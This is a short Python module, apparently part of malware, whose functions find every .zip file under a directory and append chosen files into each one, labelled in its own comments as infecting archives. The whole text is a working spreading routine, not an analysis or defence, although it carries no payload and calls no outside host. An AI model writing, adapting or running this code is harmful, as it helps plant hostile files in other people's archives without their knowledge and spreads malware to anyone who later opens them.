
# Import modules
from os import path, walk
from zipfile import is_zipfile, ZipFile

""" Find .zip files in dir """
def Scan(dir: str) -> list:
    filelist = []
    for root, _, files in walk(dir):
        for file in files:
            if file.endswith(".zip"):
                filelist.append(path.join(root, file))
    return filelist

""" Infect archive """
def Infect(archive: str, files: list):
    if not is_zipfile(archive):
        return
    if type(files) != list:
        raise ValueError(f"The second argument {repr('files')} must be a list")
    with ZipFile(archive, 'a') as zf:
        zfiles = zf.namelist()
        for file in files:
            # If file not exists
            if not path.exists(file):
                continue
            # If file already in archive
            if file in zfiles:
                continue
            # Write file
            zf.write(file)
